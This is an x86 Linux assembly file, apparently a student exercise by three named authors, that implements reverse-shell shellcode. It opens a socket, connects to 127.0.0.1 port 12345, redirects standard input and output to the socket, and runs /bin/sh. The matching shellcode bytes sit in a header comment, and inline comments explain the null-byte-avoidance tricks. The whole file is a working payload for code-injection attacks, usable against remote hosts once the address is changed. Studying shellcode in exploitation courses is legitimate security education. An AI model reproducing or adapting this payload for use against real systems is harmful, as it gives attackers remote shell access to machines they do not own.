#Julien ROLLET ............................................[14106141]
#Clement RICHET DE FORGES .................................[14107937]
#Victor BUSA ..............................................[14107023]

.globl main
	.type	main, @function
	
#"\x31\xdb\xf7\xe3\xfe\xc3\xb0\x66"
#"\x99\x52\x6a\x01\x6a\x02\x89\xe1"
#"\xcd\x80\x96\x6a\x66\x58\x43\xbf"
#"\x80\xff\xff\xfe\xf7\xd7\x57\x66"
#"\x68\x30\x39\x66\x53\x89\xe1\x6a"
#"\x10\x51\x56\x89\xe1\x43\xcd\x80"
#"\x87\xde\x6a\x02\x59\xb0\x3f\xcd"
#"\x80\x49\x79\xf9\xb0\x0b\x52\x68"
#"\x2f\x2f\x73\x68\x68\x2f\x62\x69"
#"\x6e\x89\xe3\x52\x89\xe2\x53\x89"
#"\xe1\xcd\x80";

main:
#socket(AF_INET, SOCK_STREAM, 0);
xor %ebx, %ebx			# clear ebx
mul %ebx			# clear eax
inc %bl				# %ebx = 1 = socket() (bl = lsb of ebx)
movb $0x66, %al 		# socketcall() in %eax, al = lsb of %eax
cdq				# bits of %edx are equal of the mst of %eax
				# i.e here equivalent at mov $0x0, %edx
push %edx			# IPPROTO_IP
push $0x1 			# SOCK_STREAM
push $0x2 			# AF_INET
mov %esp, %ecx			# move pointer to args to ecx
int $0x80 			# call socket(), %eax contain the socket descriptor
xchg %eax, %esi 		# save the descriptor in %esi for later use

#connect(s, [AF_INET, 12345, 127.0.0.1], 16);
push $0x66			# push/pop cost less then mov $0x66, %eax
pop %eax			# socketcall() in %eax
inc %ebx 			# %ebx = 1 so inc %ebx -> %ebx = 2 = bind()
mov $0xfeffff80, %edi		# (0xfeffff80 = 128.255.255.254)
not %edi			# %edi is now 127.0.0.1
push %edi			# push ip = 127.0.0.1
pushw $0x3930 			# PORT = 12345 (reverse cause 12345d = 0x3039)
push %bx 			# AF_INET = 2
mov %esp, %ecx			# %ecx point on the struct sockaddr.
push $16 			# sizeof(struct sockaddr)
push %ecx 			# (struct sockaddr *) &host_addr
push %esi 			# sockfd
mov %esp, %ecx			# pointer to args
inc %ebx			# %ebx = 3 = SYS_CONNECT = connect()
int $0x80 			# call connect();

#dup2(socket, i) where i = 0, 1 then 2;
xchg %ebx, %esi			# socket descriptor in %esi, 3 in %eax
push $0x2			# push/pop cost less than mov in %ecx
pop %ecx			# %ecx = counter from 2 to 0
dup2:
	movb $0x3f, %al	 	# dup2()
	int $0x80 		# call dup2()
	dec %ecx 		# decr %ecx
	jns dup2

#execve("/bin/sh", ["/bin//sh", NULL], NULL);
mov $11, %al			#execve
push %edx			#Null at the end of the string
push $0x68732f2f		# "//sh"
push $0x6e69622f		# "/bin"
mov %esp, %ebx			# address of "/bin//sh\0" in %ebx
push %edx			# push NULL
mov %esp, %edx			# tab empty (3)
push %ebx			# push addess of "/bin//sh"
mov %esp, %ecx			# argv (2)
int $0x80
